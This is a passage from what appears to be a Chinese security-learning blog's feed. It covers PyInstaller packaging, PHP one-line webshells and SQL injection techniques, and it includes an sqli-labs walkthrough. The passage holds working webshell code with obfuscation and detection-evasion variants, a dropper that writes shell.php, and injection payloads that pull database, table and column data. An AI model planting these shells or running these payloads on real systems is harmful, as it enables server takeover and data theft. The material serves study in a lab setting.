<code>--hidden-import</code> 添加缺失模块。</li></ul></li><li><p><strong>文件过大</strong></p><ul><li>启用 UPX 压缩。</li><li>检查是否有多余的依赖包。</li></ul></li><li><p><strong>路径问题</strong></p><ul><li>使用 <code>sys._MEIPASS</code> 获取运行时的临时路径：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line">path = os.path.join(sys._MEIPASS, <span class="string">&#x27;config.txt&#x27;</span>)</span><br></pre></td></tr></table></figure></div></li></ul></li></ol><hr><h2 id="8-完整命令模板"><a href="#8-完整命令模板" class="headerlink" title="8. 完整命令模板"></a><strong>8. 完整命令模板</strong></h2><p>综合多个参数的完整示例：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --noconsole --icon=app_icon.ico --add-data <span class="string">&quot;config.txt;.&quot;</span> --hidden-import=pkg_resources.py2_warn --debug=all gui_app.py</span><br></pre></td></tr></table></figure></div><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="python打包" scheme="http://example.com/tags/python%E6%89%93%E5%8C%85/"/>
    
    <category term="pyinstaller" scheme="http://example.com/tags/pyinstaller/"/>
    
  </entry>
  
  <entry>
    <title>一句话木马上</title>
    <link href="http://example.com/2024/11/11/web/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC1/"/>
    <id>http://example.com/2024/11/11/web/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC1/</id>
    <published>2024-11-11T20:10:52.000Z</published>
    <updated>2025-03-04T10:38:46.836Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一句话木马是一种短小精悍的恶意代码，通常只有一行代码，但其功能却相当强大，能够利用一些漏洞，以上传文件、修改配置等方式将恶意代码植入到受害者服务器上，并通过特殊手法在服务器端执行，以达到入侵控制目的。以下是对一句话木马的详细讲解：</p><h3 id="一、一句话木马的工作原理"><a href="#一、一句话木马的工作原理" class="headerlink" title="一、一句话木马的工作原理"></a>一、一句话木马的工作原理</h3><p>一句话木马的工作原理主要基于代码注入和远程命令执行。攻击者通过在目标服务器上植入一句话木马，可以接收来自远程客户端的控制命令，并在服务器上执行这些命令。这些命令可以包括文件上传、下载、执行系统命令、读取数据库信息等。</p><p>具体来说，一句话木马通常包含以下几个部分：</p><ol><li><strong>接收数据</strong>：通过特定的函数（如<code>$_POST</code>、<code>$_GET</code>等）接收来自远程客户端的数据。</li><li><strong>执行命令</strong>：使用某些函数（如<code>eval()</code>、<code>assert()</code>、<code>preg_replace()</code>等）执行接收到的数据中的命令。</li></ol><p>例如，一个典型的一句话木马可能看起来像这样：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>在这个例子中，<code>eval()</code>函数用于执行<code>$_POST[&#39;cmd&#39;]</code>中的PHP代码。攻击者可以通过向这个页面发送POST请求，并在请求中包含<code>cmd</code>参数来执行任意的PHP代码。</p><h3 id="二、一句话木马的变形与隐蔽性"><a href="#二、一句话木马的变形与隐蔽性" class="headerlink" title="二、一句话木马的变形与隐蔽性"></a>二、一句话木马的变形与隐蔽性</h3><p>为了绕过安全检测和提高隐蔽性，一句话木马出现了多种变形。这些变形可能包括使用不同的函数、编码方式、混淆技术等。例如：</p><ol><li><strong>使用不同的函数</strong>：除了<code>eval()</code>之外，攻击者还可以使用<code>assert()</code>、<code>create_function()</code>等函数来执行命令。</li><li><strong>编码与混淆</strong>：通过对一句话木马进行编码或混淆处理，可以使其更加难以被检测和识别。例如，可以使用Base64编码、URL编码等方式对代码进行编码处理。</li><li><strong>隐藏在图片中</strong>：攻击者还可以将一句话木马隐藏在图片文件中，并通过特定的方式将其解析为PHP代码执行。这种技术被称为“图片马”。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="一句话木马" scheme="http://example.com/categories/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>一句话木马下</title>
    <link href="http://example.com/2024/11/11/web/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC2/"/>
    <id>http://example.com/2024/11/11/web/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC2/</id>
    <published>2024-11-11T20:10:52.000Z</published>
    <updated>2025-03-04T10:38:46.836Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="一、利用不同函数"><a href="#一、利用不同函数" class="headerlink" title="一、利用不同函数"></a>一、利用不同函数</h3><ol><li><p><strong>assert()函数</strong>：</p><ul><li>写法：<code>&lt;?php assert($_POST[&#39;cmd&#39;]); ?&gt;</code></li><li>分析：<code>assert()</code>函数同样可以执行PHP代码，但不易被标记为恶意代码，因此常被用于一句话木马的变形中。</li></ul></li><li><p><strong>create_function()函数</strong>：</p><ul><li>写法：<code>&lt;?php $fun=create_function(&#39;&#39;,$_POST[&#39;a&#39;]);$fun(); ?&gt;</code></li><li>分析：<code>create_function()</code>函数可以动态创建一个匿名函数，并执行其中的代码。通过传递恶意代码作为参数，可以实现一句话木马的功能。</li></ul></li><li><p><strong>call_user_func()函数</strong>：</p><ul><li>写法：<code>&lt;?php @call_user_func(assert,$_POST[&#39;a&#39;]); ?&gt;</code></li><li>分析：<code>call_user_func()</code>函数可以调用一个指定的函数，并传递参数。在这里，它被用来调用<code>assert()</code>函数并执行恶意代码。</li></ul></li></ol><h3 id="二、混淆技术"><a href="#二、混淆技术" class="headerlink" title="二、混淆技术"></a>二、混淆技术</h3><ol><li><p><strong>字符串拼接</strong>：</p><ul><li>写法：<code>&lt;?php $&#123;&#39;_&#39;.&#39;P&#39;.&#39;O&#39;.&#39;S&#39;.&#39;T&#39;&#125;[&#39;cmd&#39;]=&quot;系统命令&quot;; ?&gt;</code></li><li>分析：通过将字符逐个拼接成函数名或变量名，可以绕过一些简单的字符串匹配检测。</li></ul></li><li><p><strong>变量替换</strong>：</p><ul><li>写法：<code>&lt;?php $a=&quot;assert&quot;;$a(@$_POST[&#39;a&#39;]); ?&gt;</code></li><li>分析：通过变量替换，将恶意函数名存储在变量中，再调用该变量执行恶意代码。</li></ul></li></ol><h3 id="三、加密与自解密"><a href="#三、加密与自解密" class="headerlink" title="三、加密与自解密"></a>三、加密与自解密</h3><ol><li><p><strong>Base64编码</strong>：</p><ul><li>写法：<code>&lt;?php eval(base64_decode(&quot;ZWNobyBoZWxsbyB3b3JsZA==&quot;)); ?&gt;</code></li><li>分析：使用Base64编码对恶意代码进行加密，然后在执行时再进行解码。这种技术可以绕过一些基于字符串匹配的检测。</li></ul></li><li><p><strong>其他加密方式</strong>：</p><ul><li>除了Base64编码外，还可以使用其他加密方式（如AES、RSA等）对恶意代码进行加密。但需要注意的是，加密后的代码需要在服务器端进行解密和执行，因此可能会增加服务器的负担和暴露更多的攻击面。</li></ul></li></ol><h3 id="四、高级变形"><a href="#四、高级变形" class="headerlink" title="四、高级变形"></a>四、高级变形</h3><ol><li><p><strong>利用正则函数执行代码</strong>：</p><ul><li>写法：<code>&lt;?php preg_replace(&#39;/.*/e&#39;,$_POST[&#39;cmd&#39;],&#39;&#39;); ?&gt;</code></li><li>分析：在某些环境下，<code>preg_replace()</code>函数可以使用<code>/e</code>修饰符来执行替换代码。通过传递恶意代码作为参数，可以实现一句话木马的功能。但需要注意的是，这种方式在PHP新版本中已被废弃或限制使用。</li></ul></li><li><p><strong>动态写入语句</strong>：</p><ul><li>写法：<code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;); ?&gt;</code></li><li>分析：通过动态写入语句的方式，在服务器上创建一个新的PHP文件，并在其中包含一句话木马。这样即使原始的一句话木马被删除或修改，攻击者仍然可以通过新创建的文件继续控制服务器。</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="一句话木马" scheme="http://example.com/categories/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>时间盲注</title>
    <link href="http://example.com/2024/11/11/web/sql%E6%B3%A8%E5%85%A5/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
    <id>http://example.com/2024/11/11/web/sql%E6%B3%A8%E5%85%A5/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</id>
    <published>2024-11-11T20:02:53.000Z</published>
    <updated>2025-03-04T10:38:46.835Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>时间盲注（Time-based Blind SQL Injection）是SQL注入攻击的一种特殊形式，尤其在Web应用程序不显示任何错误信息或反馈时使用。以下是对时间盲注的详细讲解：</p><h3 id="一、时间盲注的原理"><a href="#一、时间盲注的原理" class="headerlink" title="一、时间盲注的原理"></a>一、时间盲注的原理</h3><p>时间盲注利用了数据库的延时函数（如MySQL的SLEEP()或BENCHMARK()）来创建可以测量的响应时间差，从而推断出查询的结果。当攻击者发送一个包含延时函数的SQL查询时，如果查询的条件为真，数据库将执行延时操作，导致应用程序的响应时间显著增加。反之，如果查询的条件为假，则不会执行延时操作，应用程序响应迅速。攻击者通过观察和测量不同请求的响应时间，可以判断出数据库的某些信息。</p><h3 id="二、时间盲注的利用方式"><a href="#二、时间盲注的利用方式" class="headerlink" title="二、时间盲注的利用方式"></a>二、时间盲注的利用方式</h3><ol><li><p><strong>判断是否存在SQL注入漏洞</strong>：</p><ul><li>攻击者首先尝试在输入字段中添加单引号或其他特殊字符，观察页面响应时间。如果页面响应时间明显变长，则可能存在SQL注入漏洞。</li></ul></li><li><p><strong>获取数据库信息</strong>：</p><ul><li>攻击者通过输入特定语句（如<code>1&#39; AND IF(SUBSTRING(VERSION(),1,1)=&#39;5&#39;,SLEEP(5),0)-- -</code>），观察响应时间，可以判断出数据库类型。</li><li>利用时间盲注的原理，逐步猜测数据库名称、表名称、列名称等信息。例如，要获取数据库名称，可以尝试输入类似<code>1&#39; AND IF(SUBSTRING(DATABASE(),1,1)=&#39;s&#39;,SLEEP(5),0)-- -</code>的语句。</li></ul></li><li><p><strong>使用自动化工具</strong>：</p><ul><li>为了提高攻击效率，攻击者可能会使用自动化工具（如Burp Suite、sqlmap等）进行半自动化或自动化注入。</li><li>这些工具能够自动构造恶意输入，并分析应用程序的响应时间，以获取关键信息。</li></ul></li></ol><h3 id="四、时间盲注的案例分析"><a href="#四、时间盲注的案例分析" class="headerlink" title="四、时间盲注的案例分析"></a>四、时间盲注的案例分析</h3><p>假设有一个存在SQL注入漏洞的Web应用程序，攻击者可以通过以下步骤利用时间盲注获取数据库信息：</p><ol><li><p><strong>判断是否存在SQL注入漏洞</strong>：</p><ul><li>攻击者在输入字段中输入<code>1&#39; AND SLEEP(5)-- -</code>，观察页面响应时间。如果响应时间显著增加（如5秒），则表明存在SQL注入漏洞。</li></ul></li><li><p><strong>获取数据库版本信息</strong>：</p><ul><li>攻击者输入<code>1&#39; AND IF(SUBSTRING(VERSION(),1,1)=&#39;5&#39;,SLEEP(5),0)-- -</code>，如果响应时间增加，则表明数据库版本的第一个字符是’5’。通过不断调整猜测的字符，攻击者可以逐步获取完整的数据库版本信息。</li></ul></li><li><p><strong>获取数据库名称</strong>：</p><ul><li>攻击者使用类似的语句逐步猜测数据库名称的每个字符，直到获取完整的数据库名称。</li></ul></li><li><p><strong>获取表名称和列名称</strong>：</p><ul><li>攻击者可以继续使用时间盲注的方法获取数据库中的表名称和列名称。</li></ul></li><li><p><strong>获取数据</strong>：</p><ul><li>一旦获取了表名称和列名称，攻击者就可以构造恶意的SQL查询语句来获取表中的数据。</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>联合注入</title>
    <link href="http://example.com/2024/11/11/web/sql%E6%B3%A8%E5%85%A5/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2024/11/11/web/sql%E6%B3%A8%E5%85%A5/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</id>
    <published>2024-11-11T19:45:53.000Z</published>
    <updated>2025-03-04T10:38:46.835Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>SQL UNION注入是一种攻击技术，攻击者通过构造恶意的输入，利用UNION操作符添加额外的查询部分，将其他原本不应出现在当前查询中的数据合并到结果集中，从而达到获取敏感数据或执行未授权操作的目的。以下是对SQL UNION注入的详细讲解：</p><h3 id="一、UNION查询的特性"><a href="#一、UNION查询的特性" class="headerlink" title="一、UNION查询的特性"></a>一、UNION查询的特性</h3><p>UNION联合查询的作用是把多个表中的数据联合在一起进行显示。使用UNION查询时，需要注意以下几点：</p><ol><li>使用UNION查询的SELECT语句必须拥有相同数量的字段，同时每条SELECT语句中的字段顺序必须相同。</li><li>UNION操作符默认去除重复的记录，如果需要保留所有记录（包括重复的记录），可以使用UNION ALL。</li></ol><h3 id="二、UNION注入的原理"><a href="#二、UNION注入的原理" class="headerlink" title="二、UNION注入的原理"></a>二、UNION注入的原理</h3><p>当应用程序在构建SQL查询时，如果将用户输入未经充分验证和清理就直接拼接到查询语句中，就可能存在SQL注入漏洞。攻击者可以利用这一漏洞，通过构造恶意的输入，利用UNION操作符添加额外的查询部分，从而将其他数据合并到结果集中。</p><p>例如，原始的SQL查询可能是：</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table1 <span class="keyword">WHERE</span> <span class="keyword">condition</span> <span class="operator">=</span> <span class="string">&#x27;$user_input&#x27;</span>;</span><br></pre></td></tr></table></figure></div><p>如果应用程序没有对用户输入<code>$user_input</code>进行严格过滤和验证，攻击者可以输入类似以下的恶意内容：</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT sensitive_column1, sensitive_column2 FROM sensitive_table --</span></span><br></pre></td></tr></table></figure></div><p>这样，数据库会将攻击者构造的新查询与原始查询通过UNION连接起来执行，从而将原本受保护的敏感数据从<code>sensitive_table</code>表中提取出来并显示在结果集中。</p><h3 id="三、UNION注入的利用流程"><a href="#三、UNION注入的利用流程" class="headerlink" title="三、UNION注入的利用流程"></a>三、UNION注入的利用流程</h3><ol><li><strong>确定输入点</strong>：找到可以输入数据并且该数据会被直接拼接到SQL查询中的地方。</li><li><strong>确定字段数量</strong>：通过尝试不同数量的列，观察服务器的响应，以确定原始查询中选择的字段数量，以便在注入的UNION查询中提供相同数量的列。</li><li><strong>确定数据类型</strong>：了解每个列所期望的数据类型，以便构造合法的注入查询。</li></ol><p>一旦这些前置条件确定，攻击者就可以构造恶意的UNION查询来执行未授权的数据库操作。</p><h3 id="四、UNION注入的示例"><a href="#四、UNION注入的示例" class="headerlink" title="四、UNION注入的示例"></a>四、UNION注入的示例</h3><p>假设有一个存在SQL注入漏洞的Web应用程序，其后台SQL查询语句如下：</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span>;</span><br></pre></td></tr></table></figure></div><p>攻击者可以在<code>$id</code>参数中注入恶意的SQL代码，例如：</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select user(),database()#</span></span><br></pre></td></tr></table></figure></div><p>这样，构造的SQL查询语句将变为：</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>(),database()#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure></div><p>执行这条查询语句后，攻击者可以获得当前数据库的用户名和数据库名等敏感信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>布尔盲注</title>
    <link href="http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    <id>http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
    <published>2024-11-07T19:50:23.000Z</published>
    <updated>2025-03-04T10:38:46.835Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>布尔盲注（Boolean-based blind injection）是一种常见的SQL注入攻击技术，用于检测和利用Web应用程序中的漏洞。以下是对布尔盲注的详细讲解：</p><h3 id="一、布尔盲注的原理"><a href="#一、布尔盲注的原理" class="headerlink" title="一、布尔盲注的原理"></a>一、布尔盲注的原理</h3><p>布尔盲注的原理基于布尔逻辑运算的真假判断。当攻击者向目标应用程序发送恶意的输入时，如果应用程序存在漏洞，攻击者可以利用布尔盲注来逐步获取关键信息或执行恶意操作。由于布尔盲注不能通过直接显示的途径来获取数据库数据，攻击者需要观察应用程序的响应或页面上的行为变化，来判断某个条件是真还是假，从而推断出关键信息的值。</p><h3 id="二、布尔盲注的利用方式"><a href="#二、布尔盲注的利用方式" class="headerlink" title="二、布尔盲注的利用方式"></a>二、布尔盲注的利用方式</h3><ol><li><p><strong>判断真假</strong>：</p><ul><li>攻击者通过发送特定的恶意输入，观察应用程序的响应或页面上的行为变化，来判断某个条件是真还是假。</li></ul></li><li><p><strong>逐位判断</strong>：</p><ul><li>攻击者通常会逐位地检查关键信息的每个字符，比如数据库的表名、列名或数据内容。</li><li>通过构造特定的布尔逻辑语句，攻击者可以利用应用程序的响应，逐位地确定字符的真假。</li></ul></li><li><p><strong>基于推断</strong>：</p><ul><li>通过观察应用程序的不同响应，攻击者可以推断出关键信息的值。</li><li>例如，攻击者可以通过逐位比较字符的ASCII码范围来获取敏感信息的值。</li></ul></li></ol><h3 id="三、布尔盲注的常用语句和技巧"><a href="#三、布尔盲注的常用语句和技巧" class="headerlink" title="三、布尔盲注的常用语句和技巧"></a>三、布尔盲注的常用语句和技巧</h3><ol><li><p><strong>判断查询结果的长度</strong>：</p><ul><li>使用MySQL的<code>length()</code>函数判断返回结果的长度。</li><li>例如，判断当前数据库名的长度，可以构造如下语句：<code>?id=1&#39; and length(database())=N --</code>（其中N为猜测的长度）。</li></ul></li><li><p><strong>截取和判断字符</strong>：</p><ul><li>使用<code>substr()</code>函数截取查询结果的第一个字符。</li><li>使用<code>ascii()</code>函数将截取的字符转换成ASCII编码。</li><li>通过构造如下语句，可以判断截取的字符的ASCII码是否等于某个值：<code>?id=1&#39; and ascii(substr(database(),1,1))=M --</code>（其中M为猜测的ASCII码值）。</li></ul></li><li><p><strong>使用自动化工具</strong>：</p><ul><li>为了简化攻击过程，攻击者可以使用自动化工具，如SQL注入工具包（如sqlmap），来执行布尔盲注攻击。</li><li>这些工具能够自动构造恶意输入，并分析应用程序的响应，以获取关键信息。</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>sql注入方式(报错注入)</title>
    <link href="http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2024-11-07T16:40:52.000Z</published>
    <updated>2025-03-04T10:38:46.835Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-通过floor报错"><a href="#1-通过floor报错" class="headerlink" title="(1). 通过floor报错"></a>(1). 通过floor报错</h2><p>and (select 1 from (select count(*),concat((payload) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)</p><p>其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符</p><h2 id="2-通过updatexml报错"><a href="#2-通过updatexml报错" class="headerlink" title="(2). 通过updatexml报错"></a>(2). 通过updatexml报错</h2><p>and updatexml(1,payload,1)</p><p>同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p><h2 id="3-通过ExtractValue报错"><a href="#3-通过ExtractValue报错" class="headerlink" title="(3). 通过ExtractValue报错"></a>(3). 通过ExtractValue报错</h2><p>and extractvalue(1, payload)</p><p>输出字符有长度限制，最长32位。 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>sql靶场第一题思路</title>
    <link href="http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/study1/"/>
    <id>http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/study1/</id>
    <published>2024-11-07T09:40:02.000Z</published>
    <updated>2025-03-04T10:38:46.835Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h1><ol><li><p>url为 <a class="link"   href="http://127.0.0.1/?/id=1" >http://127.0.0.1?/id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and 1&#x3D;1时，没有报错</p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and 1&#x3D;2时，没有报错</p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ 时,报错说明是字符型注入</p></li></ol><h1 id="后台查询列数"><a href="#后台查询列数" class="headerlink" title="后台查询列数"></a>后台查询列数</h1><p>使用order by试出数据库列数</p><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ order by 数字–+ （如果试4时有错误，3时正确，那么列数为3）</p><h1 id="找显示位"><a href="#找显示位" class="headerlink" title="找显示位"></a>找显示位</h1><p>使用union select找出会返回客户端并显示的列。如果有3列时，应该这么写</p><p>url为 <a class="link"   href="http://127.0.0.1/?id=-1" >http://127.0.0.1/?id=-1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,3–+</p><p>加入显示位是3，这就意味着数据库开放了5个“窗口”用来显示内容，用查询到的数据，在这些窗口显示数据（将id弄成负数，使前面的语句失效）</p><h1 id="查库名"><a href="#查库名" class="headerlink" title="查库名"></a>查库名</h1><p>联合查询：select database();</p><p>下面是查看数据库的版本和数据库信息</p><p>假如显示位是3，<a class="link"   href="http://127.0.0.1/?id=-1" >http://127.0.0.1/?id=-1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,version,database()–+</p><p>我们发现名字可能叫users</p><h1 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h1><p>找到库名以后，使用<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’库名’–+ (如果库名是字符型，此处库名要转成十六进制)</p><p>我们发现username和password字段</p><p>information_schema:</p><p>这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库</p><h1 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h1><p>找到表之后，使用<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’表名’–+ (如果表名是字符型，此处库名要转成十六进制)</p><p>如果表数或列数过多，可以在最后使用limit加上limit 0，5相当于检索1-5条信息</p><p>查具体数据</p><p>找到列之后，使用<a class="link"   href="http://127.0.0.1/sqli-labs/Less-2/?id=1" >http://127.0.0.1/sqli-labs/Less-2/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(“要查询的数据”) from 表名 –+</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sql靶场第二题思路</title>
    <link href="http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/study2/"/>
    <id>http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/study2/</id>
    <published>2024-11-07T09:40:02.000Z</published>
    <updated>2025-03-04T10:38:46.835Z</updated>
    
